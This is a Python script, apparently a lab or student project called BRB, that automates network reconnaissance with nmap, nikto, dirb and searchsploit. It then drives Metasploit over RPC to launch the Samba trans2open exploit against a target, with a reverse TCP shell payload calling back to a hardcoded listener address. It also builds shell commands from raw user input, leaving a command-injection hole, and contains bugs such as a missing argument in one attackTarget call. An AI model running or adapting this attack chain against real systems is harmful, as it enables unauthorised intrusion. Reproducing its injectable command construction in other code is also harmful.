#!/usr/bin/env python3
# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import os
import sys
import re
import time
from pymetasploit3.msfrpc import MsfRpcClient



def logo(logoFile):
    with open(logoFile) as dasFile:
        for line in dasFile:
            print(line, end='')


def clearScreen():
    count = 0
    while count < 10000:
        print("")
        count += 1


def hostDiscovery(target):
    hostsIPV4 = []
    menuCount = 1
    menuSelect = 0
    os.system("nmap -sn -oG hostDiscovery.tmp " + target + "\/24")
    with open("hostDiscovery.tmp") as hostFile:
        for line in hostFile:
            hostsIPV4.append(str(re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)))
    clearScreen()
    for element in hostsIPV4:
        print(str(menuCount)+": "+element)
        menuCount += 1
    print("Please enter a target IP to scan further!")
    #menuSelect = input()
    runScans(str(input()))


def updateTools():
    os.system("searchsploit -u")

def attackTarget(target):
    #os.system("msfconsole msf exploit\(handler\) > load msgrpc Pass=pa55w0rd")
    #os.system("msfrpcd -U user -P pass123")
    #os.system("msfrpcd -P yourpassword -S")
    client = MsfRpcClient('yourpassword', ssl=True)
    #time.sleep(20)
    print("above")
    #print(client.modules.exploits)
    # exploit/unix/webapp/wp_admin_shell_upload
    exploit = client.modules.use('exploit', 'linux/samba/trans2open')
    print(exploit.description)
    print(target)
    exploit['RHOSTS'] = target
    print(exploit.missing_required)
    payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
    payload['LHOST'] = '192.168.56.108'
    print("------------------------------")
    print(payload.missing_required)
    #payload['ReverseAllowProxy']
    exploit.execute()
    print(client.sessions.list)
    #shell = client.sessions.session('1')
    #shell.write('whoami')
    #print(shell.read())

    print("below")
    #os.system("use exploit linux/samba/trans2open")cd /me
    #os.system("msfrpcd -P mypassword -n -f -a 127.0.0.1")
    #os.system("msfconsole")
    #time.sleep(60)
    #os.system("use linux/samba/trans2open")


"""
@author: Seraphina
We ended up not using this method because 
I happened to open the man page for searchsploit 
and realized it has a built in function for 
searching with a nmap XML file, but I wrote it so it's staying in out of spite.
"""


def findServiceVersion(nmapFile):
    srvVerDic = {}
    srvVerLst = []
    with open(nmapFile) as dasFile:
        for line in dasFile:
            if line.find("Ports:") != -1:
                srvVerLst = line.split(",")
                break
        if srvVerLst[0].find("Ports:") != -1:
            index = srvVerLst[0].find("Ports:") + 6
        srvVerLst[0] = srvVerLst[0][index:]
        for element in srvVerLst:
            tmpList = element.split('/')
            srvVerDic[tmpList[4]] = tmpList[6]
            # print(srvVerLst[element])
    # print(srvVerDic)
    # print(srvVerDic)
    return (srvVerDic)


def runScans(target):
    os.system("nmap -sX -sV -O -oX nmap.xml " + target)
    os.system("nikto -Display 1234EP -o nikto.csv -Format csv -Tuning 123bde -host " + target)
    os.system("dirb http://" + target + " -w > dirb.txt")
    os.system("searchsploit -v --nmap nmap.xml -w > exploitDB.txt")


def main():
    scansComplete = False
    logo("logo.brb")
    if len(sys.argv) == 2:
        runScans(sys.argv[1])
    elif len(sys.argv) > 2:
        for element in sys.argv:
            if element.lower() == "-d":
                hostDiscovery(sys.argv[1])
            elif element.lower() == "-u":
                updateTools()
                if not scansComplete:
                    runScans(sys.argv[1])
                    scansComplete = True
            elif element.lower() == "-a":
                if not scansComplete:
                    runScans(sys.argv[1])
                    scansComplete = True
                attackTarget()
            elif element.lower() == "-x":
                attackTarget(sys.argv[1])
    else:
        print("Please supply target IP followed by zero or more parameters -u = update tools | -a = attack target")
        print("Examples: BRB 127.0.0.1")
        print("          BRB 127.0.0.1 -u")
        print("          BRB 127.0.0.1 -u -a")


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
